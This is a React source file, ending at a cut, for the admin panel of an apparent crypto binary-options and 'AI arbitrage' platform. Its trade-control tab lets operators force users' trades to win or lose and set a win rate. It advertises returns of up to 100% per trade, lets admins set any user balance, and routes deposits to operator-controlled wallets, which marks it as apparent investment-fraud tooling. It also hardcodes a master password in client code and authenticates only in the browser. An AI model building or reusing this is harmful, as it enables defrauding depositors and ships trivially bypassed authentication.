import React, { useState, useEffect } from 'react'

// Master credentials (change these)
const MASTER_CREDENTIALS = {
  username: 'master',
  password: 'OnchainWeb2025!'
}

// Default Trading Levels
const DEFAULT_TRADING_LEVELS = [
  { level: 1, minCapital: 100, maxCapital: 19999, profit: 18, duration: 180 },
  { level: 2, minCapital: 20000, maxCapital: 30000, profit: 23, duration: 360 },
  { level: 3, minCapital: 30001, maxCapital: 50000, profit: 33.5, duration: 720 },
  { level: 4, minCapital: 50001, maxCapital: 100000, profit: 50, duration: 1080 },
  { level: 5, minCapital: 100001, maxCapital: 300000, profit: 100, duration: 3600 },
]

// Default AI Arbitrage Levels
const DEFAULT_ARBITRAGE_LEVELS = [
  { level: 1, minCapital: 1000, maxCapital: 30000, profit: 0.9, cycleDays: 2 },
  { level: 2, minCapital: 30001, maxCapital: 50000, profit: 2, cycleDays: 5 },
  { level: 3, minCapital: 50001, maxCapital: 300000, profit: 3.5, cycleDays: 7 },
  { level: 4, minCapital: 300001, maxCapital: 500000, profit: 15, cycleDays: 15 },
  { level: 5, minCapital: 500001, maxCapital: 999999999, profit: 20, cycleDays: 30 },
]

// Default Deposit Addresses
const DEFAULT_DEPOSIT_ADDRESSES = [
  { network: 'BTC', name: 'Bitcoin', address: '', enabled: true },
  { network: 'ETH', name: 'Ethereum (ERC-20)', address: '', enabled: true },
  { network: 'BSC', name: 'BNB Smart Chain (BEP-20)', address: '', enabled: true },
  { network: 'TRC20', name: 'Tron (TRC-20)', address: '', enabled: true },
  { network: 'SOL', name: 'Solana', address: '', enabled: true },
  { network: 'MATIC', name: 'Polygon', address: '', enabled: true },
]

export default function AdminPanel({ isOpen, onClose }) {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [loginUsername, setLoginUsername] = useState('')
  const [loginPassword, setLoginPassword] = useState('')
  const [loginError, setLoginError] = useState('')
  const [currentAdmin, setCurrentAdmin] = useState(null)
  const [activeTab, setActiveTab] = useState('users')
  
  // Admin accounts management
  const [adminAccounts, setAdminAccounts] = useState(() => {
    const saved = localStorage.getItem('adminAccounts')
    return saved ? JSON.parse(saved) : []
  })
  
  // All users data
  const [allUsers, setAllUsers] = useState(() => {
    const saved = localStorage.getItem('allUsersData')
    return saved ? JSON.parse(saved) : []
  })
  
  // Current user profile for editing
  const [selectedUser, setSelectedUser] = useState(null)
  const [editingUser, setEditingUser] = useState(null)
  
  // New admin form
  const [newAdminForm, setNewAdminForm] = useState({
    username: '',
    password: '',
    permissions: {
      manageUsers: true,
      manageBalances: true,
      manageKYC: true,
      manageTrades: true,
      viewReports: true,
      createAdmins: false
    }
  })
  
  // Global settings
  const [globalSettings, setGlobalSettings] = useState(() => {
    const saved = localStorage.getItem('globalAdminSettings')
    return saved ? JSON.parse(saved) : {
      welcomeBonus: 100,
      referralBonus: 50,
      tradingFee: 0.1,
      withdrawalFee: 1,
      minDeposit: 10,
      minWithdrawal: 20,
      maxWithdrawal: 10000,
      kycRequired: true,
      maintenanceMode: false,
      announcement: ''
    }
  })
  
  // Trade outcome control
  const [tradeControl, setTradeControl] = useState(() => {
    const saved = localStorage.getItem('adminTradeControl')
    return saved ? JSON.parse(saved) : {
      mode: 'auto', // 'auto', 'win', 'lose'
      winRate: 50,
      targetUserId: ''
    }
  })
  
  // Binary Trading Levels
  const [tradingLevels, setTradingLevels] = useState(() => {
    const saved = localStorage.getItem('tradingLevels')
    return saved ? JSON.parse(saved) : DEFAULT_TRADING_LEVELS
  })
  
  // AI Arbitrage Levels
  const [arbitrageLevels, setArbitrageLevels] = useState(() => {
    const saved = localStorage.getItem('aiArbitrageLevels')
    return saved ? JSON.parse(saved) : DEFAULT_ARBITRAGE_LEVELS
  })
  
  // Bonus Programs
  const [bonusPrograms, setBonusPrograms] = useState(() => {
    const saved = localStorage.getItem('adminBonusPrograms')
    return saved ? JSON.parse(saved) : {
      welcomeBonus: { amount: 100, enabled: true, description: 'Welcome bonus for new users' },
      referralBonus: { amount: 50, enabled: true, description: 'Referral bonus per friend' },
      tradingCashback: { percentage: 20, enabled: true, description: 'Trading cashback percentage' },
      stakingRewards: { apy: 12, enabled: true, description: 'Annual staking rewards' },
      vipBonus: { 
        enabled: true, 
        levels: [
          { level: 1, bonus: 0 },
          { level: 2, bonus: 5 },
          { level: 3, bonus: 10 },
          { level: 4, bonus: 15 },
          { level: 5, bonus: 25 }
        ]
      },
      promotionEnd: '2025-01-31'
    }
  })
  
  // Deposit Addresses
  const [depositAddresses, setDepositAddresses] = useState(() => {
    const saved = localStorage.getItem('adminDepositAddresses')
    return saved ? JSON.parse(saved) : DEFAULT_DEPOSIT_ADDRESSES
  })
  
  // Save to localStorage
  useEffect(() => {
    localStorage.setItem('adminAccounts', JSON.stringify(adminAccounts))
  }, [adminAccounts])
  
  useEffect(() => {
    localStorage.setItem('globalAdminSettings', JSON.stringify(globalSettings))
  }, [globalSettings])
  
  useEffect(() => {
    localStorage.setItem('adminTradeControl', JSON.stringify(tradeControl))
  }, [tradeControl])
  
  useEffect(() => {
    localStorage.setItem('tradingLevels', JSON.stringify(tradingLevels))
  }, [tradingLevels])
  
  useEffect(() => {
    localStorage.setItem('aiArbitrageLevels', JSON.stringify(arbitrageLevels))
  }, [arbitrageLevels])
  
  useEffect(() => {
    localStorage.setItem('adminBonusPrograms', JSON.stringify(bonusPrograms))
  }, [bonusPrograms])
  
  useEffect(() => {
    localStorage.setItem('adminDepositAddresses', JSON.stringify(depositAddresses))
  }, [depositAddresses])

  // Load current user data
  useEffect(() => {
    if (isOpen) {
      loadAllUsers()
    }
  }, [isOpen])
  
  const loadAllUsers = () => {
    // Get main user profile
    const userProfile = localStorage.getItem('userProfile')
    const walletData = localStorage.getItem('walletData')
    const tradeHistory = localStorage.getItem('tradeHistory')
    const aiHistory = localStorage.getItem('investmentHistory')
    
    const users = []
    
    if (userProfile) {
      const profile = JSON.parse(userProfile)
      const wallet = walletData ? JSON.parse(walletData) : { balance: 0 }
      const trades = tradeHistory ? JSON.parse(tradeHistory) : []
      const aiInvestments = aiHistory ? JSON.parse(aiHistory) : []
      
      users.push({
        id: profile.userId || '00001',
        ...profile,
        balance: wallet.balance || 0,
        points: profile.points || 0,
        totalDeposits: wallet.totalDeposits || 0,
        totalWithdrawals: wallet.totalWithdrawals || 0,
        tradeCount: trades.length,
        aiInvestmentCount: aiInvestments.length,
        lastActive: new Date().toISOString()
      })
    }
    
    setAllUsers(users)
    localStorage.setItem('allUsersData', JSON.stringify(users))
  }
  
  // Handle login
  const handleLogin = () => {
    setLoginError('')
    
    // Check master credentials
    if (loginUsername === MASTER_CREDENTIALS.username && loginPassword === MASTER_CREDENTIALS.password) {
      setIsAuthenticated(true)
      setCurrentAdmin({ 
        username: 'master', 
        role: 'master',
        permissions: {
          manageUsers: true,
          manageBalances: true,
          manageKYC: true,
          manageTrades: true,
          viewReports: true,
          createAdmins: true
        }
      })
      setLoginUsername('')
      setLoginPassword('')
      return
    }
    
    // Check admin accounts
    const admin = adminAccounts.find(a => a.username === loginUsername && a.password === loginPassword)
    if (admin) {
      setIsAuthenticated(true)
      setCurrentAdmin({ ...admin, role: 'admin' })
      setLoginUsername('')
      setLoginPassword('')
      return
    }
    
    setLoginError('Invalid username or password')
  }
  
  // Handle logout
  const handleLogout = () => {
    setIsAuthenticated(false)
    setCurrentAdmin(null)
    setLoginUsername('')
    setLoginPassword('')
  }
  
  // Create new admin
  const createAdmin = () => {
    if (!newAdminForm.username || !newAdminForm.password) {
      alert('Please fill in username and password')
      return
    }
    
    if (adminAccounts.find(a => a.username === newAdminForm.username)) {
      alert('Username already exists')
      return
    }
    
    const newAdmin = {
      id: Date.now().toString(),
      ...newAdminForm,
      createdAt: new Date().toISOString(),
      createdBy: currentAdmin.username
    }
    
    setAdminAccounts([...adminAccounts, newAdmin])
    setNewAdminForm({
      username: '',
      password: '',
      permissions: {
        manageUsers: true,
        manageBalances: true,
        manageKYC: true,
        manageTrades: true,
        viewReports: true,
        createAdmins: false
      }
    })
    alert('Admin account created successfully!')
  }
  
  // Delete admin
  const deleteAdmin = (adminId) => {
    if (confirm('Are you sure you want to delete this admin account?')) {
      setAdminAccounts(adminAccounts.filter(a => a.id !== adminId))
    }
  }
  
  // Update user balance
  const updateUserBalance = (userId, amount, type) => {
    const userProfile = JSON.parse(localStorage.getItem('userProfile') || '{}')
    const walletData = JSON.parse(localStorage.getItem('walletData') || '{"balance":0}')
    
    if (type === 'add') {
      walletData.balance = (walletData.balance || 0) + parseFloat(amount)
    } else if (type === 'subtract') {
      walletData.balance = Math.max(0, (walletData.balance || 0) - parseFloat(amount))
    } else if (type === 'set') {
      walletData.balance = parseFloat(amount)
    }
    
    localStorage.setItem('walletData', JSON.stringify(walletData))
    loadAllUsers()
    alert(`Balance updated successfully! New balance: $${walletData.balance.toFixed(2)}`)
  }
  
  // Update user KYC status
  const updateUserKYC = (userId, status) => {
    const userProfile = JSON.parse(localStorage.getItem('userProfile') || '{}')
    userProfile.kycStatus = status
    localStorage.setItem('userProfile', JSON.stringify(userProfile))
    loadAllUsers()
    alert(`KYC status updated to: ${status}`)
  }
  
  // Update user VIP level
  const updateUserVIP = (userId, level) => {
    const userProfile = JSON.parse(localStorage.getItem('userProfile') || '{}')
    userProfile.vipLevel = parseInt(level)
    localStorage.setItem('userProfile', JSON.stringify(userProfile))
    loadAllUsers()
    alert(`VIP level updated to: ${level}`)
  }
  
  // Update user points
  const updateUserPoints = (userId, points, type) => {
    const userProfile = JSON.parse(localStorage.getItem('userProfile') || '{}')
    const currentPoints = userProfile.points || 0
    
    if (type === 'add') {
      userProfile.points = currentPoints + parseInt(points)
    } else if (type === 'subtract') {
      userProfile.points = Math.max(0, currentPoints - parseInt(points))
    } else if (type === 'set') {
      userProfile.points = parseInt(points)
    }
    
    localStorage.setItem('userProfile', JSON.stringify(userProfile))
    loadAllUsers()
    alert(`Points updated successfully! New points: ${userProfile.points}`)
  }
  
  // Update trade control
  const updateTradeControl = (key, value) => {
    const newControl = { ...tradeControl, [key]: value }
    setTradeControl(newControl)
    localStorage.setItem('adminTradeControl', JSON.stringify(newControl))
  }
  
  // Update trading level
  const updateTradingLevel = (index, field, value) => {
    const updated = [...tradingLevels]
    updated[index] = { ...updated[index], [field]: parseFloat(value) || 0 }
    setTradingLevels(updated)
  }
  
  // Reset trading levels to defaults
  const resetTradingLevels = () => {
    setTradingLevels(DEFAULT_TRADING_LEVELS)
    alert('Trading levels reset to defaults!')
  }
  
  // Update arbitrage level
  const updateArbitrageLevel = (index, field, value) => {
    const updated = [...arbitrageLevels]
    updated[index] = { ...updated[index], [field]: parseFloat(value) || 0 }
    setArbitrageLevels(updated)
  }
  
  // Reset arbitrage levels to defaults
  const resetArbitrageLevels = () => {
    setArbitrageLevels(DEFAULT_ARBITRAGE_LEVELS)
    alert('AI Arbitrage levels reset to defaults!')
  }
  
  // Update bonus program
  const updateBonusProgram = (program, field, value) => {
    setBonusPrograms(prev => ({
      ...prev,
      [program]: { ...prev[program], [field]: value }
    }))
  }
  
  // Update VIP bonus level
  const updateVIPBonusLevel = (levelIndex, bonus) => {
    setBonusPrograms(prev => ({
      ...prev,
      vipBonus: {
        ...prev.vipBonus,
        levels: prev.vipBonus.levels.map((l, i) => 
          i === levelIndex ? { ...l, bonus: parseInt(bonus) || 0 } : l
        )
      }
    }))
  }
  
  // Update deposit address
  const updateDepositAddress = (index, field, value) => {
    const updated = [...depositAddresses]
    updated[index] = { ...updated[index], [field]: value }
    setDepositAddresses(updated)
  }
  
  // Update global settings
  const updateGlobalSetting = (key, value) => {
    const newSettings = { ...globalSettings, [key]: value }
    setGlobalSettings(newSettings)
  }
  
  // Send notification to user
  const sendNotification = (message) => {
    const notifications = JSON.parse(localStorage.getItem('userNotifications') || '[]')
    notifications.unshift({
      id: Date.now(),
      message,
      timestamp: new Date().toISOString(),
      read: false,
      fromAdmin: true
    })
    localStorage.setItem('userNotifications', JSON.stringify(notifications))
    alert('Notification sent!')
  }

  if (!isOpen) return null

  return (
    <div className="admin-modal-overlay" onClick={onClose}>
      <div className="admin-modal master-admin" onClick={e => e.stopPropagation()}>
        {!isAuthenticated ? (
          // Login Screen
          <div className="admin-login">
            <div className="admin-login-header">
              <div className="admin-logo">🔐</div>
              <h2>Admin Login</h2>
              <p>Enter your credentials to access the admin panel</p>
            </div>
            
            <div className="admin-login-form">
              <div className="form-group">
                <label>Username</label>
                <input
                  type="text"
                  value={loginUsername}
                  onChange={e => setLoginUsername(e.target.value)}
                  placeholder="Enter username"
                  onKeyPress={e => e.key === 'Enter' && handleLogin()}
                />
              </div>
              
              <div className="form-group">
                <label>Password</label>
                <input
                  type="password"
                  value={loginPassword}
                  onChange={e => setLoginPassword(e.target.value)}
                  placeholder="Enter password"
                  onKeyPress={e => e.key === 'Enter' && handleLogin()}
                />
              </div>
              
              {loginError && <div className="login-error">{loginError}</div>}
              
              <button className="admin-login-btn" onClick={handleLogin}>
                Login
              </button>
            </div>
            
            <button className="admin-close-btn" onClick={onClose}>×</button>
          </div>
        ) : (
          // Admin Dashboard
          <div className="admin-dashboard">
            <div className="admin-header">
              <div className="admin-title">
                <h2>👑 {currentAdmin.role === 'master' ? 'Master' : ''} Admin Panel</h2>
                <span className="admin-user">Logged in as: {currentAdmin.username}</span>
              </div>
              <div className="admin-actions">
                <button className="logout-btn" onClick={handleLogout}>Logout</button>
                <button className="close-btn" onClick={onClose}>×</button>
              </div>
            </div>
            
            {/* Tabs - Scrollable */}
            <div className="admin-tabs-wrapper">
              <div className="admin-tabs">
                <button 
                  className={`tab ${activeTab === 'users' ? 'active' : ''}`}
                  onClick={() => setActiveTab('users')}
                >
                  👥 Users
                </button>
                <button 
                  className={`tab ${activeTab === 'trades' ? 'active' : ''}`}
                  onClick={() => setActiveTab('trades')}
                >
                  📊 Trade Control
                </button>
                <button 
                  className={`tab ${activeTab === 'levels' ? 'active' : ''}`}
                  onClick={() => setActiveTab('levels')}
                >
                  📈 Levels
                </button>
                <button 
                  className={`tab ${activeTab === 'bonus' ? 'active' : ''}`}
                  onClick={() => setActiveTab('bonus')}
                >
                  🎁 Bonus
                </button>
                <button 
                  className={`tab ${activeTab === 'addresses' ? 'active' : ''}`}
                  onClick={() => setActiveTab('addresses')}
                >
                  💳 Addresses
                </button>
                <button 
                  className={`tab ${activeTab === 'settings' ? 'active' : ''}`}
                  onClick={() => setActiveTab('settings')}
                >
                  ⚙️ Settings
                </button>
                <button 
                  className={`tab ${activeTab === 'notifications' ? 'active' : ''}`}
                  onClick={() => setActiveTab('notifications')}
                >
                  🔔 Notify
                </button>
                {(currentAdmin.role === 'master' || currentAdmin.permissions?.createAdmins) && (
                  <button 
                    className={`tab ${activeTab === 'admins' ? 'active' : ''}`}
                    onClick={() => setActiveTab('admins')}
                  >
                    🛡️ Admins
                  </button>
                )}
              </div>
            </div>
            
            {/* Tab Content */}
            <div className="admin-content">
              {/* Users Tab */}
              {activeTab === 'users' && (
                <div className="users-section">
                  <div className="section-header">
                    <h3>User Management</h3>
                    <button className="refresh-btn" onClick={loadAllUsers}>🔄 Refresh</button>
                  </div>
                  
                  {allUsers.length === 0 ? (
                    <p className="no-data">No users found</p>
                  ) : (
                    <div className="users-list">
                      {allUsers.map(user => (
                        <div key={user.id} className="user-card">
                          <div className="user-info">
                            <div className="user-avatar">{user.avatar || '👤'}</div>
                            <div className="user-details">
                              <h4>{user.firstName && user.lastName ? `${user.firstName} ${user.lastName}` : user.username}</h4>
                              <span className="user-id">ID: {user.id || user.userId}</span>
                              <span className={`kyc-badge ${user.kycStatus}`}>
                                {user.kycStatus === 'verified' ? '✓ Verified' : 
                                 user.kycStatus === 'pending' ? '⏳ Pending' : '✗ Not Verified'}
                              </span>
                            </div>
                          </div>
                          
                          <div className="user-stats">
                            <div className="stat">
                              <span className="label">Balance</span>
                              <span className="value">${(user.balance || 0).toFixed(2)}</span>
                            </div>
                            <div className="stat">
                              <span className="label">Points</span>
                              <span className="value">{user.points || 0}</span>
                            </div>
                            <div className="stat">
                              <span className="label">VIP Level</span>
                              <span className="value">{user.vipLevel || 1}</span>
                            </div>
                            <div className="stat">
                              <span className="label">Trades</span>
                              <span className="value">{user.tradeCount || 0}</span>
                            </div>
                          </div>
                          
                          <div className="user-actions">
                            <div className="action-group">
                              <label>Balance:</label>
                              <input 
                                type="number" 
                                id={`balance-${user.id}`}
                                placeholder="Amount"
                                className="small-input"
                              />
                              <button onClick={() => {
                                const amount = document.getElementById(`balance-${user.id}`).value
                                if (amount) updateUserBalance(user.id, amount, 'add')
                              }}>+ Add</button>
                              <button onClick={() => {
                                const amount = document.getElementById(`balance-${user.id}`).value
                                if (amount) updateUserBalance(user.id, amount, 'subtract')
                              }}>- Sub</button>
                              <button onClick={() => {
                                const amount = document.getElementById(`balance-${user.id}`).value
                                if (amount) updateUserBalance(user.id, amount, 'set')
                              }}>= Set</button>
                            </div>
                            
                            <div className="action-group">
                              <label>Points:</label>
                              <input 
                                type="number" 
                                id={`points-${user.id}`}
                                placeholder="Points"
                                className="small-input"
                              />
                              <button onClick={() => {
                                const points = document.getElementById(`points-${user.id}`).value
                                if (points) updateUserPoints(user.id, points, 'add')
                              }}>+ Add</button>
                              <button onClick={() => {
                                const points = document.getElementById(`points-${user.id}`).value
                                if (points) updateUserPoints(user.id, points, 'subtract')
                              }}>- Sub</button>
                              <button onClick={() => {
                                const points = document.getElementById(`points-${user.id}`).value
                                if (points) updateUserPoints(user.id, points, 'set')
                              }}>= Set</button>
                            </div>
                            
                            <div className="action-group">
                              <label>KYC:</label>
                              <select onChange={e => updateUserKYC(user.id, e.target.value)} value={user.kycStatus}>
                                <option value="pending">Pending</option>
                                <option value="verified">Verified</option>
                                <option value="rejected">Rejected</option>
                              </select>
                            </div>
                            
                            <div className="action-group">
                              <label>VIP:</label>
                              <select onChange={e => updateUserVIP(user.id, e.target.value)} value={user.vipLevel || 1}>
                                <option value="1">Level 1</option>
                                <option value="2">Level 2</option>
                                <option value="3">Level 3</option>
                                <option value="4">Level 4</option>
                                <option value="5">Level 5</option>
                              </select>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
              
              {/* Trade Control Tab */}
              {activeTab === 'trades' && (
                <div className="trades-section">
                  <h3>Trade Outcome Control</h3>
                  <p className="section-desc">Control the outcome of binary options trades</p>
                  
                  <div className="control-group">
                    <label>Trade Mode:</label>
                    <div className="radio-group">
                      <label className={`radio-btn ${tradeControl.mode === 'auto' ? 'active' : ''}`}>
                        <input 
                          type="radio" 
                          name="tradeMode" 
                          value="auto"
                          checked={tradeControl.mode === 'auto'}
                          onChange={e => updateTradeControl('mode', 'auto')}
                        />
                        🎲 Auto (Natural)
                      </label>
                      <label className={`radio-btn ${tradeControl.mode === 'win' ? 'active' : ''}`}>
                        <input 
                          type="radio" 
                          name="tradeMode" 
                          value="win"
                          checked={tradeControl.mode === 'win'}
                          onChange={e => updateTradeControl('mode', 'win')}
                        />
                        ✅ Force Win
                      </label>
                      <label className={`radio-btn ${tradeControl.mode === 'lose' ? 'active' : ''}`}>
                        <input 
                          type="radio" 
                          name="tradeMode" 
                          value="lose"
                          checked={tradeControl.mode === 'lose'}
                          onChange={e => updateTradeControl('mode', 'lose')}
                        />
                        ❌ Force Lose
                      </label>
                    </div>
                  </div>
                  
                  <div className="control-group">
                    <label>Win Rate (for Auto mode):</label>
                    <div className="slider-group">
                      <input 
                        type="range" 
                        min="0" 
                        max="100"
                        value={tradeControl.winRate}
                        onChange={e => updateTradeControl('winRate', parseInt(e.target.value))}
                      />
                      <span className="slider-value">{tradeControl.winRate}%</span>
                    </div>
                  </div>
                  
                  <div className="info-box">
                    <h4>Current Settings:</h4>
                    <p>Mode: <strong>{tradeControl.mode === 'auto' ? 'Automatic' : tradeControl.mode === 'win' ? 'Force Win' : 'Force Lose'}</strong></p>
                    <p>Win Rate: <strong>{tradeControl.winRate}%</strong></p>
                  </div>
                  
                  <div className="trade-history-section">
                    <h4>Recent Trade History</h4>
                    <div className="trade-history-list">
                      {(() => {
                        const history = JSON.parse(localStorage.getItem('tradeHistory') || '[]')
                        return history.slice(0, 10).map((trade, idx) => (
                          <div key={idx} className={`trade-item ${trade.result}`}>
                            <span className="trade-time">{new Date(trade.timestamp).toLocaleString()}</span>
                            <span className="trade-asset">{trade.asset}</span>
                            <span className="trade-amount">${trade.amount}</span>
                            <span className={`trade-result ${trade.result}`}>
                              {trade.result === 'win' ? '+' : '-'}${trade.profit?.toFixed(2) || trade.amount}
                            </span>
                          </div>
                        ))
                      })()}
                    </div>
                  </div>
                </div>
              )}
              
              {/* Levels Tab - Binary Trading & AI Arbitrage Levels */}
              {activeTab === 'levels' && (
                <div className="levels-section">
                  {/* Binary Trading Levels */}
                  <div className="level-group">
                    <h3>📊 Binary Trading Levels</h3>
                    <p className="section-desc">Configure capital requirements, duration, and profit % for each trading level</p>
                    
                    <div className="levels-table">
                      <div className="levels-header">
                        <span>Level</span>
                        <span>Min Capital ($)</span>
                        <span>Max Capital ($)</span>
                        <span>Profit (%)</span>
                        <span>Duration (sec)</span>
                      </div>
                      {tradingLevels.map((level, index) => (
                        <div key={level.level} className="level-row">
                          <span className="level-badge">Lvl {level.level}</span>
                          <input
                            type="number"
                            value={level.minCapital}
                            onChange={e => updateTradingLevel(index, 'minCapital', e.target.value)}
                          />
                          <input
                            type="number"
                            value={level.maxCapital}
                            onChange={e => updateTradingLevel(index, 'maxCapital', e.target.value)}
                          />
                          <input
                            type="number"
                            step="0.1"
                            value={level.profit}
                            onChange={e => updateTradingLevel(index, 'profit', e.target.value)}
                          />
                          <input
                            type="number"
                            value={level.duration}
                            onChange={e => updateTradingLevel(index, 'duration', e.target.value)}
                          />
                        </div>
                      ))}
                    </div>
                    <button className="reset-btn" onClick={resetTradingLevels}>
                      🔄 Reset to Defaults
                    </button>
                  </div>
                  
                  {/* AI Arbitrage Levels */}
                  <div className="level-group">
                    <h3>🤖 AI Arbitrage Levels</h3>
                    <p className="section-desc">Configure capital requirements, cycle duration, and profit % for AI arbitrage</p>
                    
                    <div className="levels-table">
                      <div className="levels-header">
                        <span>Level</span>
                        <span>Min Capital ($)</span>
                        <span>Max Capital ($)</span>
                        <span>Profit (%)</span>
                        <span>Cycle (days)</span>
                      </div>
                      {arbitrageLevels.map((level, index) => (
                        <div key={level.level} className="level-row">
                          <span className="level-badge">Lvl {level.level}</span>
                          <input
                            type="number"
                            value={level.minCapital}
                            onChange={e => updateArbitrageLevel(index, 'minCapital', e.target.value)}
                          />
                          <input
                            type="number"
                            value={level.maxCapital}
                            onChange={e => updateArbitrageLevel(index, 'maxCapital', e.target.value)}
                          />
                          <input
                            type="number"
                            step="0.1"
                            value={level.profit}
                            onChange={e => updateArbitrageLevel(index, 'profit', e.target.value)}
                          />
                          <input
                            type="number"
                            value={level.cycleDays}
                            onChange={e => updateArbitrageLevel(index, 'cycleDays', e.target.value)}
                          />
                        </div>
                      ))}
                    </div>
                    <button className="reset-btn" onClick={resetArbitrageLevels}>
                      🔄 Reset to Defaults
                    </button>
                  </div>
                </div>
              )}
              
              {/* Bonus Programs Tab */}
              {activeTab === 'bonus' && (
                <div className="bonus-section">
                  <h3>🎁 Bonus Program Management</h3>
                  <p className="section-desc">Configure all bonus programs and rewards</p>
                  
                  <div className="bonus-grid">
                    {/* Welcome Bonus */}
                    <div className="bonus-card-admin">
                      <div className="bonus-header">
                        <span className="bonus-icon">🎉</span>
                        <h4>Welcome Bonus</h4>
                        <label className="switch small">
                          <input 
                            type="checkbox"
                            checked={bonusPrograms.welcomeBonus.enabled}
                            onChange={e => updateBonusProgram('welcomeBonus', 'enabled', e.target.checked)}
                          />
                          <span className="slider"></span>
                        </label>
                      </div>
                      <div className="bonus-field">
                        <label>Amount (USDT)</label>
                        <input 
                          type="number"
                          value={bonusPrograms.welcomeBonus.amount}
                          onChange={e => updateBonusProgram('welcomeBonus', 'amount', parseFloat(e.target.value))}
                        />
                      </div>
                      <div className="bonus-field">
                        <label>Description</label>
                        <input 
                          type="text"
                          value={bonusPrograms.welcomeBonus.description}
                          onChange={e => updateBonusProgram('welcomeBonus', 'description', e.target.value)}
                        />
                      </div>
                    </div>
                    
                    {/* Referral Bonus */}
                    <div className="bonus-card-admin">
                      <div className="bonus-header">
                        <span className="bonus-icon">👥</span>
                        <h4>Referral Bonus</h4>
                        <label className="switch small">
                          <input 
                            type="checkbox"
                            checked={bonusPrograms.referralBonus.enabled}
                            onChange={e => updateBonusProgram('referralBonus', 'enabled', e.target.checked)}
                          />
                          <span className="slider"></span>
                        </label>
                      </div>
                      <div className="bonus-field">
                        <label>Amount per Referral (USDT)</label>
                        <input 
                          type="number"
                          value={bonusPrograms.referralBonus.amount}
                          onChange={e => updateBonusProgram('referralBonus', 'amount', parseFloat(e.target.value))}
                        />
                      </div>
                      <div className="bonus-field">
                        <label>Description</label>
                        <input 
                          type="text"
                          value={bonusPrograms.referralBonus.description}
                          onChange={e => updateBonusProgram('referralBonus', 'description', e.target.value)}
                        />
                      </div>
                    </div>
                    
                    {/* Trading Cashback */}
                    <div className="bonus-card-admin">
                      <div className="bonus-header">
                        <span className="bonus-icon">💹</span>
                        <h4>Trading Cashback</h4>
                        <label className="switch small">
                          <input 
                            type="checkbox"
                            checked={bonusPrograms.tradingCashback.enabled}
                            onChange={e => updateBonusProgram('tradingCashback', 'enabled', e.target.checked)}
                          />
                          <span className="slider"></span>
                        </label>
                      </div>
                      <div className="bonus-field">
                        <label>Cashback Percentage (%)</label>
                        <input 
                          type="number"
                          value={bonusPrograms.tradingCashback.percentage}
                          onChange={e => updateBonusProgram('tradingCashback', 'percentage', parseFloat(e.target.value))}
                        />
                      </div>
                      <div className="bonus-field">
                        <label>Description</label>
                        <input 
                          type="text"
                          value={bonusPrograms.tradingCashback.description}
                          onChange={e => updateBonusProgram('tradingCashback', 'description', e.target.value)}
                        />
                      </div>
                    </div>
                    
                    {/* Staking Rewards */}
                    <div className="bonus-card-admin">
                      <div className="bonus-header">
                        <span className="bonus-icon">🔒</span>
                        <h4>Staking Rewards</h4>
                        <label className="switch small">
                          <input 
                            type="checkbox"
                            checked={bonusPrograms.stakingRewards.enabled}
                            onChange={e => updateBonusProgram('stakingRewards', 'enabled', e.target.checked)}
                          />
                          <span className="slider"></span>
                        </label>
                      </div>
                      <div className="bonus-field">
                        <label>Annual APY (%)</label>
                        <input 
                          type="number"
                          value={bonusPrograms.stakingRewards.apy}
                          onChange={e => updateBonusProgram('stakingRewards', 'apy', parseFloat(e.target.value))}
                        />
                      </div>
                      <div className="bonus-field">
                        <label>Description</label>
                        <input 
                          type="text"
                          value={bonusPrograms.stakingRewards.description}
                          onChange={e => updateBonusProgram('stakingRewards', 'description', e.target.value)}
                        />
                      </div>
                    </div>
                  </div>
                  
                  {/* VIP Level Bonuses */}
                  <div className="vip-bonus-section">
                    <h4>👑 VIP Level Bonuses</h4>
                    <div className="vip-bonus-grid">
                      {bonusPrograms.vipBonus.levels.map((vip, index) => (
                        <div key={vip.level} className="vip-bonus-item">
                          <span className="vip-level">Level {vip.level}</span>
                          <div className="vip-input">
                            <input 
                              type="number"
                              value={vip.bonus}
                              onChange={e => updateVIPBonusLevel(index, e.target.value)}
                            />
                            <span>%</span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                  
                  {/* Promotion End Date */}
                  <div className="promotion-date">
                    <label>Promotion End Date</label>
                    <input 
                      type="date"
                      value={bonusPrograms.promotionEnd}
                      onChange={e => setBonusPrograms(prev => ({ ...prev, promotionEnd: e.target.value }))}
                    />
                  </div>
                </div>
              )}
              
              {/* Deposit Addresses Tab */}
              {activeTab === 'addresses' && (
                <div className="addresses-section">
                  <h3>💳 Deposit Addresses Management</h3>
                  <p className="section-desc">Configure deposit wallet addresses for each network</p>
                  
                  <div className="addresses-list">
                    {depositAddresses.map((addr, index) => (
                      <div key={addr.network} className="address-card">
                        <div className="address-header">
                          <div className="network-info">
                            <span className="network-name">{addr.name}</span>
                            <span className="network-code">{addr.network}</span>
                          </div>
                          <label className="switch small">
                            <input 
                              type="checkbox"
                              checked={addr.enabled}
                              onChange={e => updateDepositAddress(index, 'enabled', e.target.checked)}
                            />
                            <span className="slider"></span>
                          </label>
                        </div>
                        <div className="address-input">
                          <label>Wallet Address</label>
                          <input 
                            type="text"
                            value={addr.address}
                            onChange={e => updateDepositAddress(index, 'address', e.target.value)}
                            placeholder={`Enter ${addr.network} deposit address`}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                  
                  <div className="addresses-info">
                    <p className="info-text">
                      💡 <strong>Note:</strong> These addresses will be shown to users when they want to deposit funds. 
                      Make sure to enter valid wallet addresses that you control.
                    </p>
                  </div>
                </div>
              )}
              
              {/* Settings Tab */}
              {activeTab === 'settings' && (
                <div className="settings-section">
                  <h3>Global Settings</h3>
                  
                  <div className="settings-grid">
                    <div className="setting-item">
                      <label>Welcome Bonus (USDT)</label>
                      <input 
                        type="number"
                        value={globalSettings.welcomeBonus}
                        onChange={e => updateGlobalSetting('welcomeBonus', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item">
                      <label>Referral Bonus (USDT)</label>
                      <input 
                        type="number"
                        value={globalSettings.referralBonus}
                        onChange={e => updateGlobalSetting('referralBonus', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item">
                      <label>Trading Fee (%)</label>
                      <input 
                        type="number"
                        step="0.01"
                        value={globalSettings.tradingFee}
                        onChange={e => updateGlobalSetting('tradingFee', parseFloat(e.target.value))}
                      />
                    </div>
                    
                    <div className="setting-item">
                      <label>Withdrawal Fee (USDT)</label>
                      <input 
                        type="number"
                        value={globalSettings.withdrawalFee}
